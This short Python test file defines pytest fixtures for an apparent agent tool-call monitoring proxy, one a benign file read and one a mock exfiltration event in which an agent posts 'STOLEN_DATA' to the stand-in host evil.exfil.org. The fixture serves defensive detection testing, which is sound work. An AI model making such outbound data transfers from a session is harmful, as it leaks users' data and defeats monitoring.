import pytest

from cerberus.proxy.models import ToolCallEvent


@pytest.fixture
def sample_event():
    return ToolCallEvent(
        session_id="test-session-01",
        agent_id="test-agent-01",
        tool_name="read_file",
        tool_server="file-server",
        parameters={"path": "src/main.py"},
        sequence_position=0,
    )


@pytest.fixture
def hostile_exfil_event():
    return ToolCallEvent(
        session_id="test-session-02",
        agent_id="test-agent-01",
        tool_name="http_post",
        tool_server="webhook-server",
        parameters={"payload": "STOLEN_DATA"},
        parameter_size_bytes=15000,
        destination_domain="evil.exfil.org",
        sequence_position=4,
    )
